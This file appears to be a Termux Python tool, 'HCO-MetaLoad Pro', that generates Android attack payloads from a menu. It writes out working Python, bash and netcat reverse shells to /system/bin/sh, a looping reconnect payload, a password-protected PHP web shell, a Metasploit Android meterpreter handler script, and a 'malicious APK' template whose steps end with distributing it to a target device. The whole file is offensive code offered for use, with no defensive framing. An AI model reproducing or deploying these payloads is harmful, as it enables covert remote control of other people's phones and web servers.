#!/usr/bin/env python3
"""
HCO-MetaLoad Pro - Simple Android Payload Generator
One-click payload generation for Android 15+
"""

import os
import sys
import time
import socket
import subprocess
from datetime import datetime

# ---------------------------
# Colors
# ---------------------------
GREEN = "\033[32m"
BLUE = "\033[34m"
RED = "\033[31m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
WHITE = "\033[37m"
RESET = "\033[0m"

class SimplePayloadGenerator:
    def __init__(self):
        self.download_dir = "/sdcard/Download"
        self.setup_directories()
    
    def setup_directories(self):
        """Setup download directory"""
        if not os.path.exists(self.download_dir):
            # Try to create Download directory
            os.makedirs("/data/data/com.termux/files/home/storage/downloads", exist_ok=True)
            self.download_dir = "/data/data/com.termux/files/home/storage/downloads"
    
    def show_banner(self):
        """Display banner"""
        os.system("clear")
        print(f"""{RED}
    ██╗  ██╗ ██████╗ ██████╗      ███╗   ███╗███████╗████████╗ █████╗ ██╗      ██████╗  ██████╗ ██████╗ 
    ██║  ██║██╔═══██╗██╔══██╗     ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗
    ███████║██║   ██║██████╔     ██╔████╔██║█████╗     ██║   ███████║██║     ██║   ██║██║   ██║██║  ██║
    ██╔══██║██║   ██║██╔══██╗     ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║██║     ██║   ██║██║   ██║██║  ██║
    ██║  ██║╚██████╔║██║  ██║     ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████╗╚██████╔╝╚██████╔╝██████╔╝
    ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
    {RESET}""")
        print(f"{CYAN}                    One-Click Android Payload Generator v2.0{RESET}")
        print(f"{YELLOW}                         Android 15+ Support | Termux Optimized{RESET}")
        print(f"{MAGENTA}                              Payloads saved in Download folder{RESET}\n")

    def get_local_ip(self):
        """Get local IP address"""
        try:
            # Connect to Google DNS to get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def create_python_reverse_shell(self):
        """Create Python reverse shell that works on Android"""
        lhost = self.get_local_ip()
        lport = "4444"
        filename = f"py_reverse_{int(time.time())}.py"
        filepath = os.path.join(self.download_dir, filename)
        
        payload = f'''#!/usr/bin/env python3
import socket,subprocess,os

def reverse_shell():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{lhost}",{lport}))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        subprocess.call(["/system/bin/sh","-i"])
    except: pass

reverse_shell()
'''
        
        with open(filepath, "w") as f:
            f.write(payload)
        
        print(f"{GREEN}✓ Python Reverse Shell Created!{RESET}")
        print(f"{CYAN}📁 File: {filepath}{RESET}")
        print(f"{YELLOW}🎯 Listener: nc -lvnp {lport}{RESET}")
        print(f"{MAGENTA}⚡ Run: python3 {filename}{RESET}")
        return filepath

    def create_bash_reverse_shell(self):
        """Create Bash reverse shell"""
        lhost = self.get_local_ip()
        lport = "5555"
        filename = f"bash_reverse_{int(time.time())}.sh"
        filepath = os.path.join(self.download_dir, filename)
        
        payload = f'''#!/system/bin/sh
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''
        
        with open(filepath, "w") as f:
            f.write(payload)
        os.chmod(filepath, 0o755)
        
        print(f"{GREEN}✓ Bash Reverse Shell Created!{RESET}")
        print(f"{CYAN}📁 File: {filepath}{RESET}")
        print(f"{YELLOW}🎯 Listener: nc -lvnp {lport}{RESET}")
        print(f"{MAGENTA}⚡ Run: sh {filename}{RESET}")
        return filepath

    def create_android_payload(self):
        """Create advanced Android payload"""
        lhost = self.get_local_ip()
        lport = "4444"
        filename = f"android_payload_{int(time.time())}.sh"
        filepath = os.path.join(self.download_dir, filename)
        
        payload = f'''#!/system/bin/sh
# Advanced Android Payload
echo "Android Payload Started"
while true; do
    echo "Trying connection to {lhost}:{lport}"
    nc {lhost} {lport} -e /system/bin/sh 2>/dev/null
    busybox nc {lhost} {lport} -e /system/bin/sh 2>/dev/null
    sleep 10
done
'''
        
        with open(filepath, "w") as f:
            f.write(payload)
        os.chmod(filepath, 0o755)
        
        print(f"{GREEN}✓ Android Payload Created!{RESET}")
        print(f"{CYAN}📁 File: {filepath}{RESET}")
        print(f"{YELLOW}🎯 Listener: nc -lvnp {lport}{RESET}")
        print(f"{MAGENTA}⚡ Run: sh {filename}{RESET}")
        return filepath

    def create_web_shell(self):
        """Create PHP web shell"""
        password = "hco123"
        filename = f"web_shell_{int(time.time())}.php"
        filepath = os.path.join(self.download_dir, filename)
        
        payload = f'''<?php
if(isset($_POST['p']) && $_POST['p']=="{password}"){{
    if(isset($_POST['cmd'])){{
        echo "<pre>".shell_exec($_POST['cmd'])."</pre>";
    }}
}}
?>
<form method=post>
Pass: <input type=password name=p>
Cmd: <input type=text name=cmd size=50>
<input type=submit value=Execute>
</form>
'''
        
        with open(filepath, "w") as f:
            f.write(payload)
        
        print(f"{GREEN}✓ PHP Web Shell Created!{RESET}")
        print(f"{CYAN}📁 File: {filepath}{RESET}")
        print(f"{YELLOW}🔑 Password: {password}{RESET}")
        print(f"{MAGENTA}🌐 Upload to web server and access via browser{RESET}")
        return filepath

    def create_meterpreter_script(self):
        """Create Metasploit meterpreter script"""
        lhost = self.get_local_ip()
        lport = "4444"
        filename = f"meterpreter_{int(time.time())}.rc"
        filepath = os.path.join(self.download_dir, filename)
        
        payload = f'''# Metasploit Meterpreter Script
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
'''
        
        with open(filepath, "w") as f:
            f.write(payload)
        
        print(f"{GREEN}✓ Meterpreter Script Created!{RESET}")
        print(f"{CYAN}📁 File: {filepath}{RESET}")
        print(f"{YELLOW}🎯 Run in Metasploit: msfconsole -r {filename}{RESET}")
        print(f"{MAGENTA}📱 Generates Android meterpreter session{RESET}")
        return filepath

    def create_apk_payload(self):
        """Create APK payload template"""
        filename = f"malicious_app_{int(time.time())}.txt"
        filepath = os.path.join(self.download_dir, filename)
        
        payload = '''# Android APK Payload Template
# Instructions to create malicious APK:

1. Download Android Studio
2. Create new project
3. Add this code to MainActivity:

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    
    // Reverse shell payload
    new Thread(() -> {
        try {
            String host = "YOUR_IP_HERE";
            int port = 4444;
            Process process = Runtime.getRuntime().exec("/system/bin/sh");
            Socket socket = new Socket(host, port);
            
            // Redirect streams
            InputStream socketInput = socket.getInputStream();
            OutputStream socketOutput = socket.getOutputStream();
            InputStream processInput = process.getInputStream();
            OutputStream processOutput = process.getOutputStream();
            
            // Stream forwarding code here...
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }).start();
}

4. Build APK and sign it
5. Distribute to target device
'''
        
        with open(filepath, "w") as f:
            f.write(payload)
        
        print(f"{GREEN}✓ APK Payload Guide Created!{RESET}")
        print(f"{CYAN}📁 File: {filepath}{RESET}")
        print(f"{YELLOW}📚 Complete guide to create malicious APK{RESET}")
        return filepath

    def create_termux_script(self):
        """Create Termux automation script"""
        filename = f"termux_auto_{int(time.time())}.sh"
        filepath = os.path.join(self.download_dir, filename)
        
        payload = '''#!/data/data/com.termux/files/usr/bin/bash
# Termux Automation Script
echo "Termux Auto-Script Started"

# Update packages
pkg update -y && pkg upgrade -y

# Install essential tools
pkg install -y python python-pip nodejs ruby php curl wget git

# Install hacking tools
pkg install -y nmap hydra sqlmap wireshark tsu

# Install Python modules
pip install requests beautifulsoup4 scapy cryptography

echo "Installation completed!"
echo "Available tools: nmap, hydra, sqlmap, python3, php, ruby"
'''
        
        with open(filepath, "w") as f:
            f.write(payload)
        os.chmod(filepath, 0o755)
        
        print(f"{GREEN}✓ Termux Auto-Script Created!{RESET}")
        print(f"{CYAN}📁 File: {filepath}{RESET}")
        print(f"{MAGENTA}⚡ Run: bash {filename}{RESET}")
        return filepath

    def show_menu(self):
        """Show main menu"""
        print(f"\n{BLUE}🚀 Quick Payload Generator{RESET}")
        print(f"{GREEN}1. Python Reverse Shell (Android){RESET}")
        print(f"{GREEN}2. Bash Reverse Shell{RESET}")
        print(f"{GREEN}3. Advanced Android Payload{RESET}")
        print(f"{CYAN}4. PHP Web Shell{RESET}")
        print(f"{CYAN}5. Meterpreter Script{RESET}")
        print(f"{MAGENTA}6. APK Payload Guide{RESET}")
        print(f"{MAGENTA}7. Termux Auto-Script{RESET}")
        print(f"{YELLOW}8. Create All Payloads{RESET}")
        print(f"{RED}0. Exit{RESET}")
        
        try:
            choice = input(f"\n{YELLOW}🎯 Choose option (0-8): {RESET}").strip()
            return choice
        except KeyboardInterrupt:
            return "0"

    def create_all_payloads(self):
        """Create all payload types"""
        print(f"\n{CYAN}🚀 Creating all payloads...{RESET}")
        
        payloads = []
        payloads.append(self.create_python_reverse_shell())
        print("")
        payloads.append(self.create_bash_reverse_shell())
        print("")
        payloads.append(self.create_android_payload())
        print("")
        payloads.append(self.create_web_shell())
        print("")
        payloads.append(self.create_meterpreter_script())
        print("")
        payloads.append(self.create_apk_payload())
        print("")
        payloads.append(self.create_termux_script())
        
        print(f"\n{GREEN}✅ All payloads created successfully!{RESET}")
        print(f"{CYAN}📂 Location: {self.download_dir}{RESET}")
        return payloads

def main():
    generator = SimplePayloadGenerator()
    generator.show_banner()
    
    print(f"{YELLOW}📱 Detected Device Info:{RESET}")
    print(f"{CYAN}📂 Download folder: {generator.download_dir}{RESET}")
    print(f"{CYAN}🌐 Your IP: {generator.get_local_ip()}{RESET}")
    print(f"{GREEN}✅ Ready to generate payloads!{RESET}")
    
    while True:
        choice = generator.show_menu()
        
        if choice == "1":
            generator.create_python_reverse_shell()
        elif choice == "2":
            generator.create_bash_reverse_shell()
        elif choice == "3":
            generator.create_android_payload()
        elif choice == "4":
            generator.create_web_shell()
        elif choice == "5":
            generator.create_meterpreter_script()
        elif choice == "6":
            generator.create_apk_payload()
        elif choice == "7":
            generator.create_termux_script()
        elif choice == "8":
            generator.create_all_payloads()
        elif choice == "0":
            print(f"\n{YELLOW}👋 Thank you for using HCO-MetaLoad Pro!{RESET}")
            break
        else:
            print(f"{RED}❌ Invalid choice!{RESET}")
        
        input(f"\n{YELLOW}⏎ Press Enter to continue...{RESET}")
        generator.show_banner()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}👋 Tool interrupted by user{RESET}")
    except Exception as e:
        print(f"{RED}❌ Error: {e}{RESET}")
